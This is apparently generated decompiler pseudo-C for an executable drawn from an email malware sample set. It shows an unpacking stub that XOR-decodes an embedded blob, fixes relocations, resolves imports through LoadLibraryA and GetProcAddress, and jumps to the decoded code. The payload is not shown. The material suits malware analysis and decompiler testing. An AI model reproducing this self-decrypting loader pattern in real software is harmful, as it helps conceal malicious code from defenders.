// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0100/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401000(word32 ecx, word32 edx, word32 edi)
{
fn00401000_entry:
l00401000:
	word32 eax_30 = AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000)
	Eq_16 * esi_15 = null
	Eq_16 * ebx_287 = eax_30 + 0x00000023
	branch AreAllAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) != 0x00000000 l0040102D
l0040102A:
	ebx_287 = eax_30 + 0x00000001;
l0040102D:
	fp->dwFFFFFFE4 = 0x00000059;
	CloseHandle(0xFFFFFFFF)
	fp->dwFFFFFFE4 = fp - 0x00000008;
	fp->dwFFFFFFE4 = 0x00000040;
	fp->dwFFFFFFE4 = 0x00003000;
	fp->dwFFFFFFE4 = 0x00401000;
	VirtualProtect(0x00000000, 0x00000000, 0xFFFFFFFF, 0xFFFFFFFF)
	Eq_66 * eax_63 = null
l00401051:
	branch esi_15 != ebx_287 l0040105A
l00401058:
	esi_15 = null;
l0040105A:
	byte v15_85 = eax_63->b4011C0 ^ esi_15->b404000
	eax_63->b4011C0 = v15_85;
	eax_63 = eax_63 + 1;
	esi_15 = esi_15 + 1;
	branch eax_63 <u (Eq_66 *) 0x00001420 l00401051
l00401079:
	Eq_89 * edi_107 = &globals->t4024A0
	up32 dwLoc04_100 = 0x00000000
l00401094:
	word32 eax_109 = edi_107->dw0004
	Eq_118 * esi_116 = &edi_107->t0008
	branch eax_109 - 0x00000008 >>u 0x00000001 <= 0x00000000 l004010E1
l004010A6:
	uint32 ebp_255 = eax_109 - 0x00000008 >>u 0x00000001
l004010B0:
	branch (esi_116->w0000 & 0xF000) != 0x3000 l004010D9
l004010C2:
	Eq_172 * eax_277 = ((word32) esi_116->w0000 & 0x00000FFF) + edi_107->dw0000
	eax_277->dw400F40 = eax_277->dw400F40 + 0xF0400F40;
l004010D9:
	esi_116 = esi_116 + 1;
	ebp_255 = ebp_255 - 0x00000001;
	branch ebp_255 != 0x00000000 l004010B0
l004010E1:
	word32 eax_123 = edi_107->dw0004
	up32 ecx_125 = dwLoc04_100 + eax_123
	Eq_99 * edi_126 = edi_107 + eax_123
	branch ecx_125 <u 0x000000E4 l00401094
	word32 eax_130 = edi_126->dw0004
	up32 ecx_132 = ecx_125 + eax_130
	edi_107 = edi_126 + eax_130;
	dwLoc04_100 = ecx_132;
	branch ecx_132 <u 0x000000E4 l00401094
l004010F8:
	branch Mem86[0x00401CAC:word32] == 0x00000000 l00401179
	Eq_139 * edi_143 = &globals->t401C9C
	Eq_139 * dwLoc04_144 = &globals->t401C9C
	branch Mem86[0x00401CAC:word32] == 0x00000000 l00401179
l0040110B:
	edi_170 = edi_143;
l00401110:
	Eq_139 * edi_170
	Eq_154 eax_176 = LoadLibraryA(edi_170->dw000C + 0x00400F40)
	branch eax_176 == 0x00000000 l0040116C
l00401122:
	word32 edi_203
	word32 eax_198 = edi_170->dw0000
	branch eax_198 == 0x00000000 l0040112C
l00401128:
	edi_203 = eax_198;
	goto l0040112F
l0040112C:
	edi_203 = edi_170->dw0010;
l0040112F:
	Eq_207 * edi_206 = edi_203 + 0x00400F40
	Eq_210 * esi_207 = dwLoc04_144->dw0010 + 0x00400F40
	branch edi_206->dw0000 == 0x00000000 l00401168
l0040113F:
l00401140:
	Eq_223 dwLoc1C_237
	int32 eax_231 = edi_206->dw0000
	word16 ax_232 = (word16) eax_231
	branch eax_231 >= 0x00000000 l0040114F
l00401149:
	dwLoc1C_237 = (word32) ax_232;
	goto l00401154
l0040114F:
	dwLoc1C_237 = eax_231 + 0x00400F42;
l00401154:
	esi_207->dw0000 = GetProcAddress(eax_176, dwLoc1C_237);
	edi_206 = edi_206 + 1;
	esi_207 = esi_207 + 1;
	branch edi_206->dw0000 != 0x00000000 l00401140
l00401168:
	edi_170 = dwLoc04_144;
l0040116C:
	edi_170 = edi_170 + 1;
	dwLoc04_144 = edi_170;
	branch edi_170->dw0010 != 0x00000000 l00401110
l00401179:
	0x00401990()
	ExitProcess(0x00000000)
fn00401000_exit:
}

